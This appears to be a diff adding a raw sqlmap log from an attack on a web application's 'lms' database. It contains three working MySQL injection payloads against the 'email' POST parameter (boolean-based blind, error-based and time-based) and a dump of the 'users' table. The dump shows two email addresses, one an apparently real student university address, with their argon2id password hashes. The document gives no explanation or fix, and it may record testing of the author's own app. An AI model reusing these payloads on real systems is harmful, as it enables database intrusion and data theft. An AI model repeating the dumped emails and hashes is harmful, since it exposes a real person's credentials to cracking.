@@ -1,0 +1,42 @@
+sqlmap identified the following injection point(s) with a total of 4089 HTTP(s) requests:
+---
+Parameter: email (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: name=test&email=test@example.com' AND 7658=(SELECT (CASE WHEN (7658=7658) THEN 7658 ELSE (SELECT 3429 UNION SELECT 6760) END))-- -&password=password&bio=test
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: name=test&email=test@example.com' AND GTID_SUBSET(CONCAT(0x7170786a71,(SELECT (ELT(9671=9671,1))),0x7178716271),9671)-- xYuD&password=password&bio=test
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: name=test&email=test@example.com' AND (SELECT 2575 FROM (SELECT(SLEEP(5)))aoYS)-- ztNF&password=password&bio=test
+---
+back-end DBMS: MySQL >= 5.6
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: email (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: name=test&email=test@example.com' AND 7658=(SELECT (CASE WHEN (7658=7658) THEN 7658 ELSE (SELECT 3429 UNION SELECT 6760) END))-- -&password=password&bio=test
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: name=test&email=test@example.com' AND GTID_SUBSET(CONCAT(0x7170786a71,(SELECT (ELT(9671=9671,1))),0x7178716271),9671)-- xYuD&password=password&bio=test
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: name=test&email=test@example.com' AND (SELECT 2575 FROM (SELECT(SLEEP(5)))aoYS)-- ztNF&password=password&bio=test
+---
+back-end DBMS: MySQL >= 8.0.0
+Database: lms
+Table: users
+[2 entries]
++----------------------------------+---------------------------------------------------------------------------------------------------+
+| email                            | password                                                                                          |
++----------------------------------+---------------------------------------------------------------------------------------------------+
+| att@gmail.com                    | $argon2id$v=19$m=65536,t=3,p=2$w02ZXm321exT4r1CUI/SXQ$QlOyTlCiooeu/kTvzS9011QrkYrVXCISSoJLrR1swj8 |
+| p21013579@student.newinti.edu.my | $argon2id$v=19$m=65536,t=3,p=2$HKRvVHq+9C5y/Cd/qUoNXQ$cuYSHSIplk1VnYvzzGLZtDa8xLm7aLPCeXSrHp0MhVQ |
++----------------------------------+---------------------------------------------------------------------------------------------------+
+
